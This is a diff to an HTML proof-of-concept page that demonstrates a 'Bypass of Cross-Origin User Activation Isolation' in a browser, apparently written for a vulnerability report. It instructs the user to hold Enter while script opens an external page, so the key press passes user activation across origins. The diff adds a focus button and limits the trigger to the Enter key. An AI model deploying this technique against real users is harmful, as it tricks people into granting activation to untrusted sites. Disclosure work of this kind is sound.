@@ -2,9 +2,13 @@
 <html>
 
 <body style="background: #fff5f5; font-family: sans-serif; text-align: center; padding: 50px;">
+    <button id="pre-focus-btn" style="padding: 10px 20px; font-size: 16px; margin-bottom: 20px; cursor: pointer; background: #444; color: white; border: none; border-radius: 4px;">
+        Click 2x and Enter
+    </button>
+
     <h1>Bypass of Cross-Origin User Activation Isolation</h1>
 
-    <div style="border: 2px dashed #ff4444; padding: 20px;">
+    <div style="border: 2px dashed #ff4444; padding: 20px; background: white;">
         <p>1. Click anywhere to focus this page.</p>
         <p>2. <b>Press & HOLD the "Enter" key</b></p>
         <p>3. Keep holding while the new page opens</p>
@@ -14,7 +18,13 @@
         const targetURL = "https://cape-poc.vercel.app/";
         let opened = false;
 
+        document.getElementById('pre-focus-btn').addEventListener('dblclick', () => {
+            console.log("[*] Button double-clicked. Page focused.");
+            window.focus();
+        });
+
         document.addEventListener("keydown", (event) => {
+            if (event.key !== "Enter") return;
             if (event.repeat || opened) return;
 
             opened = true;
